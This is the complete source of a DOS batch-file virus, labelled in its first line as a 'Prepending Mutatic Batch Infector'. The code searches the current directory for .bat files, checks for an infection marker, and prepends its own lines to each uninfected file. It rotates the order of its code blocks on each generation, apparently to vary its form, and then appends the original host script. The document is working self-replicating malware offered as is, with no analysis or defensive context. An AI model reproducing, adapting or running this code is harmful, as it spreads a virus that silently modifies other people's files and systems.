REM 1777Bytes Prepending Mutatic Batch Infector
@echo off%CW%%n0a%
set val=0
set argh1=bat%n0b%
goto s%n0b%
:s %n1%
if '%1' == '' goto c%n1%
find "CW" <%1 >nul%n1%
if not errorlevel 1 goto e%n1%
if exist %0.bat goto b%n1%
goto a%n1%
:a %n2%
set f=%0%n2%
goto i %n2%
:b %n3%
set f=%0.bat%n3%
goto i %n3%
:i %n4%
ren %1 vir.tmp%n4%
set v1=n%n4%
set v2=0a%n4%
find "%v1%%v2%"<%f% >%1%n4%
if '%val%' == '4' set v2a=5%n4%
if '%val%' == '4' set v2b=1%n4%
if '%val%' == '4' set v2c=2%n4%
if '%val%' == '4' set v2d=3%n4%
if '%val%' == '4' set v2e=4%n4%
if '%val%' == '4' set val=5%n4%
if '%val%' == '3' set v2a=4%n4%
if '%val%' == '3' set v2b=5%n4%
if '%val%' == '3' set v2c=1%n4%
if '%val%' == '3' set v2d=2%n4%
if '%val%' == '3' set v2e=3%n4%
if '%val%' == '3' set val=4%n4%
if '%val%' == '2' set v2a=3%n4%
if '%val%' == '2' set v2b=4%n4%
if '%val%' == '2' set v2c=5%n4%
if '%val%' == '2' set v2d=1%n4%
if '%val%' == '2' set v2e=2%n4%
if '%val%' == '2' set val=3%n4%
if '%val%' == '1' set v2a=2%n4%
if '%val%' == '1' set v2b=3%n4%
if '%val%' == '1' set v2c=4%n4%
if '%val%' == '1' set v2d=5%n4%
if '%val%' == '1' set v2e=1%n4%
if '%val%' == '1' set val=2%n4%
if '%val%' == '0' set v2a=1%n4%
if '%val%' == '0' set v2b=2%n4%
if '%val%' == '0' set v2c=3%n4%
if '%val%' == '0' set v2d=4%n4%
if '%val%' == '0' set v2e=5%n4%
if '%val%' == '0' set val=1%n4%
if '%val%' == '5' set val=0%n4%
:i1 %n4%
echo set val=%val%>>%1%n4%
set v2=0b%n4%
find "%v1%%v2%"<%f% >>%1%n4%
find "%v1%%v2a%"<%f% >>%1%n4%
find "%v1%%v2b%"<%f% >>%1%n4%
find "%v1%%v2c%"<%f% >>%1%n4%
find "%v1%%v2d%"<%f% >>%1%n4%
find "%v1%%v2e%"<%f% >>%1%n4%
echo :d>>%1%n4%
type vir.tmp >>%1%n4%
echo :e>>%1%n4%
del vir.tmp%n4%
goto e%n4%
:c %n5%
for %%a in (*.%argh1%) do call %0 %%a%n5%
goto d%n5%
:d
echo host file
:e
